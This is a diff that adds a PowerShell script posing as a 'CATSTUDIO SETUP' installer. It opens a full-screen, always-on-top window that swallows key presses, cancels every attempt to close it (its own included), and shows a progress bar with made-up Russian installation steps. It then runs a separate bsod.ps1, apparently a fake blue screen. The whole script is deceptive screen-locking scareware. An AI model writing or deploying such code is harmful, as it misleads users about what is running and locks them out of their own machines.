@@ -1,0 +1,77 @@
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
+$f = New-Object System.Windows.Forms.Form
+$f.FormBorderStyle = 'None'
+$f.WindowState    = 'Maximized'
+$f.TopMost        = $true
+$f.BackColor      = [System.Drawing.Color]::FromArgb(255,10,10,15)
+$f.ShowInTaskbar  = $false
+$f.KeyPreview     = $true
+$f.Add_KeyDown({ $_.SuppressKeyPress = $true })
+$f.Add_FormClosing({ $_.Cancel = $true })
+
+$title = New-Object System.Windows.Forms.Label
+$title.ForeColor = 'White'
+$title.Font      = New-Object System.Drawing.Font('Segoe UI',26)
+$title.AutoSize  = $false
+$title.Dock      = 'Top'
+$title.Height    = 60
+$title.TextAlign = 'MiddleCenter'
+$title.Text      = 'CATSTUDIO SETUP'
+
+$bar = New-Object System.Windows.Forms.ProgressBar
+$bar.Dock   = 'None'
+$bar.Width  = 600
+$bar.Height = 28
+$bar.Style  = 'Continuous'
+$bar.Minimum = 0
+$bar.Maximum = 100
+$bar.Value  = 0
+
+$status = New-Object System.Windows.Forms.Label
+$status.ForeColor = 'Silver'
+$status.Font      = New-Object System.Drawing.Font('Consolas',13)
+$status.AutoSize  = $false
+$status.Dock      = 'None'
+$status.Width     = 600
+$status.Height    = 26
+$status.TextAlign = 'MiddleCenter'
+$status.Text      = 'Инициализация...'
+
+$f.Controls.Add($title)
+$f.Controls.Add($bar)
+$f.Controls.Add($status)
+
+$f.Add_Shown({
+    $sw = 600; $sh = 140
+    $x = [int](($f.ClientSize.Width  - $sw) / 2)
+    $y = [int](($f.ClientSize.Height - $sh) / 2)
+    $bar.Location    = New-Object System.Drawing.Point($x, $y)
+    $status.Location = New-Object System.Drawing.Point($x, ($y + 40))
+
+    $steps = @(
+        'Распаковка пакетов...',
+        'Проверка лицензии...',
+        'Загрузка модулей...',
+        'Установка драйверов...',
+        'Настройка реестра...',
+        'Финальная инициализация...'
+    )
+
+    for ($i = 1; $i -le 100; $i++) {
+        $bar.Value = $i
+        $idx = [int](($i - 1) / 100 * $steps.Count)
+        if ($idx -ge $steps.Count) { $idx = $steps.Count - 1 }
+        $status.Text = $steps[$idx]
+        [System.Windows.Forms.Application]::DoEvents()
+        Start-Sleep -Milliseconds 35
+    }
+
+    Start-Sleep -Milliseconds 400
+    $f.Close()
+})
+
+[System.Windows.Forms.Application]::Run($f)
+
+# === после загрузки — BSOD ===
+. "$PSScriptRoot\bsod.ps1"
